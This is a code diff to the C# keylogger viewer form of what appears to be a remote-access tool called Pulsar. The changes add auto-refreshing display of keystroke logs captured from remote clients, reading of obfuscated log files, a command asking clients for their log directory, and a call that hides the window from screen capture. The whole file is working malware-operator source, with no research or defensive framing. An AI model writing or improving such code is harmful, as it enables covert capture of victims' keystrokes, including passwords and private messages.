@@ -1,77 +1,96 @@
-﻿using Pulsar.Common.Messages;
+﻿using Pulsar.Common.Helpers;
+using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Monitoring.KeyLogger;
 using Pulsar.Server.Forms.DarkMode;
 using Pulsar.Server.Helper;
 using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
 using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
 {
     public partial class FrmKeylogger : Form
     {
-        /// <summary>
-        /// The client which can be used for the keylogger.
-        /// </summary>
         private readonly Client _connectClient;
-
-        /// <summary>
-        /// The message handler for handling the communication with the client.
-        /// </summary>
         private readonly KeyloggerHandler _keyloggerHandler;
+        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new();
 
-        /// <summary>
-        /// Path to the base download directory of the client.
-        /// </summary>
-        private readonly string _baseDownloadPath;
+        private readonly Timer autoRefreshTimer = new();
+        private StringBuilder currentLogCache = new();
+        private string _previousContent = string.Empty;
+        private readonly object _contentLock = new object();
+        private DateTime _lastRefreshTime = DateTime.MinValue;
+        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(500);
+        private FileSystemWatcher _fileWatcher;
+        private string _currentWatchedFile;
 
-        /// <summary>
-        /// Holds the opened keylogger form for each client.
-        /// </summary>
-        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();
-
-        /// <summary>
-        /// Creates a new keylogger form for the client or gets the current open form, if there exists one already.
-        /// </summary>
-        /// <param name="client">The client used for the keylogger form.</param>
-        /// <returns>
-        /// Returns a new keylogger form for the client if there is none currently open, otherwise creates a new one.
-        /// </returns>
         public static FrmKeylogger CreateNewOrGetExisting(Client client)
         {
-            if (OpenedForms.ContainsKey(client))
-            {
-                return OpenedForms[client];
-            }
-            FrmKeylogger f = new FrmKeylogger(client);
-            f.Disposed += (sender, args) => OpenedForms.Remove(client);
-            OpenedForms.Add(client, f);
-            return f;
+            if (OpenedForms.TryGetValue(client, out var existingForm))
+                return existingForm;
+
+            var form = new FrmKeylogger(client);
+            form.Disposed += (s, e) => OpenedForms.Remove(client);
+            OpenedForms.Add(client, form);
+            return form;
         }
 
-        /// <summary>
-        /// Initializes a new instance of the <see cref="FrmKeylogger"/> class using the given client.
-        /// </summary>
-        /// <param name="client">The client used for the keylogger form.</param>
         public FrmKeylogger(Client client)
         {
-            _connectClient = client;
+            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
             _keyloggerHandler = new KeyloggerHandler(client);
 
-            _baseDownloadPath = Path.Combine(_connectClient.Value.DownloadDirectory, "Logs\\");
-
-            RegisterMessageHandler();
             InitializeComponent();
-
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+
+            RegisterMessageHandler();
+
+            // SYNC WITH CLIENT: 2-second refresh to match keylogger flush interval
+            autoRefreshTimer.Interval = 2000;
+            autoRefreshTimer.Tick += AutoRefreshTimer_Tick;
+
+            InitializeFileWatcher();
         }
 
-        /// <summary>
-        /// Registers the keylogger message handler for client communication.
-        /// </summary>
+        private void InitializeFileWatcher()
+        {
+            _fileWatcher = new FileSystemWatcher
+            {
+                Path = Path.GetTempPath(),
+                Filter = "*.txt",
+                NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size,
+                EnableRaisingEvents = false
+            };
+
+            _fileWatcher.Changed += FileWatcher_Changed;
+        }
+
+        private void FileWatcher_Changed(object sender, FileSystemEventArgs e)
+        {
+            if (e.ChangeType == WatcherChangeTypes.Changed &&
+                e.FullPath == _currentWatchedFile &&
+                lstLogs.SelectedItems.Count > 0)
+            {
+                System.Threading.Thread.Sleep(100); // small delay to ensure file is not locked
+                SafeInvoke(RefreshSelectedLog);
+            }
+        }
+
+        private void AutoRefreshTimer_Tick(object sender, EventArgs e)
+        {
+            if (checkBox1.Checked && lstLogs.SelectedItems.Count > 0)
+                RefreshSelectedLog();
+        }
+
         private void RegisterMessageHandler()
         {
             _connectClient.ClientState += ClientDisconnected;
@@ -79,9 +98,6 @@ namespace Pulsar.Server.Forms
             MessageHandler.Register(_keyloggerHandler);
         }
 
-        /// <summary>
-        /// Unregisters the keylogger message handler.
-        /// </summary>
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_keyloggerHandler);
@@ -89,92 +105,315 @@ namespace Pulsar.Server.Forms
             _connectClient.ClientState -= ClientDisconnected;
         }
 
-        /// <summary>
-        /// Called whenever a client disconnects.
-        /// </summary>
-        /// <param name="client">The client which disconnected.</param>
-        /// <param name="connected">True if the client connected, false if disconnected</param>
         private void ClientDisconnected(Client client, bool connected)
         {
             if (!connected)
-            {
-                this.Invoke((MethodInvoker)this.Close);
-            }
+                SafeInvoke(Close);
         }
 
-        /// <summary>
-        /// Called whenever the keylogger logs finished retrieving.
-        /// </summary>
-        /// <param name="sender">The message processor which raised the event.</param>
-        /// <param name="message">The status message.</param>
-        private void LogsChanged(object sender, string message)
+        private void LogsChanged(object? sender, string message)
         {
-            RefreshLogsDirectory();
-            btnGetLogs.Enabled = true;
-            stripLblStatus.Text = "Status: " + message;
+            SafeInvoke(RefreshLogsDirectory);
         }
+        private void ApplyGreenToHeaders()
+        {
+            // Regex to match lines starting with [HH:MM:SS]
+            var regex = new System.Text.RegularExpressions.Regex(@"^\[\d{2}:\d{2}:\d{2}\].*$",
+                System.Text.RegularExpressions.RegexOptions.Multiline);
 
+            foreach (System.Text.RegularExpressions.Match match in regex.Matches(rtbLogViewer.Text))
+            {
+                rtbLogViewer.Select(match.Index, match.Length);
+                rtbLogViewer.SelectionColor = Color.LimeGreen; // make the whole line green
+            }
+
+            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
+            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor; // reset default color for normal text
+        }
         private void FrmKeylogger_Load(object sender, EventArgs e)
         {
-            this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
-
-            if (!Directory.Exists(_baseDownloadPath))
-            {
-                Directory.CreateDirectory(_baseDownloadPath);
-                return;
-            }
-
+            Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
             RefreshLogsDirectory();
+
+            if (lstLogs.Items.Count > 0)
+            {
+                lstLogs.Items[0].Selected = true;
+                lstLogs.Focus();
+                UpdateFileWatcher();
+                RefreshSelectedLog();
+            }
         }
 
         private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
         {
             UnregisterMessageHandler();
             _keyloggerHandler.Dispose();
+            _fileWatcher?.Dispose();
+            autoRefreshTimer.Stop();
+            autoRefreshTimer.Dispose();
         }
 
-        private void btnGetLogs_Click(object sender, EventArgs e)
+        private void lstLogs_SelectedIndexChanged(object sender, EventArgs e)
         {
-            btnGetLogs.Enabled = false;
-            stripLblStatus.Text = "Status: Retrieving logs...";
-            _keyloggerHandler.RetrieveLogs();
+            if (lstLogs.SelectedItems.Count > 0)
+            {
+                UpdateFileWatcher();
+                RefreshSelectedLog();
+            }
         }
 
         private void lstLogs_ItemActivate(object sender, EventArgs e)
         {
+            RefreshSelectedLog();
+        }
+
+        private void UpdateFileWatcher()
+        {
             if (lstLogs.SelectedItems.Count > 0)
             {
-                try
-                {
-                    string logFilePath = Path.Combine(_baseDownloadPath, lstLogs.SelectedItems[0].Text);
-                    if (File.Exists(logFilePath))
-                    {
-                        string logContent = File.ReadAllText(logFilePath);
-                        rtbLogViewer.Text = logContent;
-                    }
-                    else
-                    {
-                        rtbLogViewer.Text = "Log file not found.";
-                    }
-                }
-                catch (Exception ex)
-                {
-                    rtbLogViewer.Text = $"Error loading log file: {ex.Message}";
-                }
+                _currentWatchedFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
+                _fileWatcher.EnableRaisingEvents = checkBox1.Checked;
             }
+            else
+                _fileWatcher.EnableRaisingEvents = false;
         }
 
         private void RefreshLogsDirectory()
         {
-            lstLogs.Items.Clear();
+            string previouslySelected = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;
 
-            DirectoryInfo dicInfo = new DirectoryInfo(_baseDownloadPath);
-
-            FileInfo[] iFiles = dicInfo.GetFiles();
-
-            foreach (FileInfo file in iFiles)
+            SafeInvoke(() =>
             {
-                lstLogs.Items.Add(new ListViewItem { Text = file.Name });
+                lstLogs.Items.Clear();
+                try
+                {
+                    // Regex: 2025-11-10.txt or 2025-11-10_01.txt
+                    var validPattern = new System.Text.RegularExpressions.Regex(@"^\d{4}-\d{2}-\d{2}(?:_\d{2})?\.txt$");
+
+                    var files = new DirectoryInfo(Path.GetTempPath())
+                        .GetFiles("*.txt")
+                        .Where(f => validPattern.IsMatch(f.Name)) // ✅ filter only valid log filenames
+                        .OrderByDescending(f => f.LastWriteTime)
+                        .ToList();
+
+                    foreach (var file in files)
+                        lstLogs.Items.Add(new ListViewItem(file.Name));
+
+                    // Restore previous selection if it still exists
+                    if (!string.IsNullOrEmpty(previouslySelected))
+                    {
+                        var item = lstLogs.Items.Cast<ListViewItem>()
+                            .FirstOrDefault(i => i.Text == previouslySelected);
+                        if (item != null)
+                        {
+                            item.Selected = true;
+                            lstLogs.Focus();
+                        }
+                    }
+                    else if (lstLogs.Items.Count > 0)
+                    {
+                        lstLogs.Items[0].Selected = true;
+                        lstLogs.Focus();
+                    }
+
+                    UpdateFileWatcher();
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Refresh logs error: {ex.Message}");
+                }
+            });
+        }
+
+        private void RefreshSelectedLog()
+        {
+            if (lstLogs.SelectedItems.Count == 0) return;
+
+            string logFilePath = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
+
+            Task.Run(() =>
+            {
+                try
+                {
+                    if (!File.Exists(logFilePath))
+                    {
+                        SafeInvoke(() => rtbLogViewer.Text = "Log file not found.");
+                        return;
+                    }
+
+                    string logContent = ReadFileWithRetry(logFilePath);
+                    if (logContent == null) return;
+
+                    // Remove spam & duplicates, then merge broken lines
+                    string filteredContent = FilterAndDeduplicateLog(logContent);
+                    filteredContent = MergeBrokenLines(filteredContent);
+
+                    lock (_contentLock)
+                    {
+                        if (filteredContent != currentLogCache.ToString())
+                        {
+                            currentLogCache.Clear();
+                            currentLogCache.Append(filteredContent);
+
+                            SafeInvoke(() =>
+                            {
+                                rtbLogViewer.Clear();
+                                rtbLogViewer.Text = currentLogCache.ToString();
+
+                                // Color any line starting with [HH:MM:SS] green
+                                ApplyGreenToHeaders();
+
+                                rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
+                                rtbLogViewer.ScrollToCaret();
+                            });
+
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    SafeInvoke(() => rtbLogViewer.Text = $"Error loading log file: {ex.Message}");
+                }
+            });
+        }
+
+        private string ReadFileWithRetry(string filePath, int maxRetries = 3)
+        {
+            for (int i = 0; i < maxRetries; i++)
+            {
+                try
+                {
+                    return FileHelper.ReadObfuscatedLogFile(filePath);
+                }
+                catch (IOException) when (i < maxRetries - 1)
+                {
+                    System.Threading.Thread.Sleep(50);
+                }
+            }
+            return null;
+        }
+
+        private string FilterAndDeduplicateLog(string content)
+        {
+            if (string.IsNullOrEmpty(content)) return content;
+
+            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+            var seen = new HashSet<string>();
+            var result = new List<string>();
+
+            foreach (var line in lines)
+            {
+                var trimmed = line.Trim();
+
+                if (trimmed.StartsWith("Log created on") ||
+                    trimmed.StartsWith("Session started at:") ||
+                    trimmed.StartsWith("========================================"))
+                    continue;
+
+                if (!seen.Contains(trimmed))
+                {
+                    result.Add(trimmed);
+                    seen.Add(trimmed);
+                }
+            }
+
+            return string.Join(Environment.NewLine, result);
+        }
+
+        private string MergeBrokenLines(string content)
+        {
+            if (string.IsNullOrEmpty(content)) return content;
+
+            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+            var merged = new StringBuilder();
+            string currentHeader = null;
+            StringBuilder textBuffer = new StringBuilder();
+
+            foreach (var line in lines)
+            {
+                var trimmed = line.Trim();
+                if (string.IsNullOrEmpty(trimmed)) continue;
+
+                // Header detection: [HH:MM:SS]
+                if (trimmed.StartsWith("[") && trimmed.Contains("]"))
+                {
+                    if (currentHeader != null)
+                    {
+                        merged.AppendLine(currentHeader);
+                        if (textBuffer.Length > 0)
+                            merged.AppendLine(textBuffer.ToString());
+                        textBuffer.Clear();
+                    }
+                    currentHeader = trimmed;
+                }
+                else
+                {
+                    // Append with a space only if last char is a letter/number and first char is NOT lowercase continuation
+                    if (textBuffer.Length > 0)
+                    {
+                        char lastChar = textBuffer[^1];
+                        char firstChar = trimmed[0];
+
+                        if (char.IsLetterOrDigit(lastChar) && char.IsLetterOrDigit(firstChar))
+                        {
+                            // Only remove space if it’s a lowercase continuation (like broken word)
+                            if (char.IsLower(lastChar) && char.IsLower(firstChar))
+                                ; // merge without space
+                            else
+                                textBuffer.Append(" "); // normal word separation
+                        }
+                        else
+                        {
+                            textBuffer.Append(" ");
+                        }
+                    }
+                    textBuffer.Append(trimmed);
+                }
+            }
+
+            if (currentHeader != null)
+            {
+                merged.AppendLine(currentHeader);
+                if (textBuffer.Length > 0)
+                    merged.AppendLine(textBuffer.ToString());
+            }
+
+            return merged.ToString();
+        }
+
+        // Only remove spaces between letters, not between words or numbers
+        private string FixBrokenLetters(string text)
+        {
+            return System.Text.RegularExpressions.Regex.Replace(
+                text, @"(?<=\w)\s(?=\w)", ""
+            );
+        }
+
+        private void SafeInvoke(Action action)
+        {
+            if (InvokeRequired)
+                Invoke(action);
+            else
+                action();
+        }
+
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new GetKeyloggerLogsDirectory());
+        }
+
+
+        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
+        {
+            if (checkBox1.Checked)
+            {
+                autoRefreshTimer.Start();
+                _fileWatcher.EnableRaisingEvents = true;
+            }
+            else
+            {
+                autoRefreshTimer.Stop();
+                _fileWatcher.EnableRaisingEvents = false;
             }
         }
     }
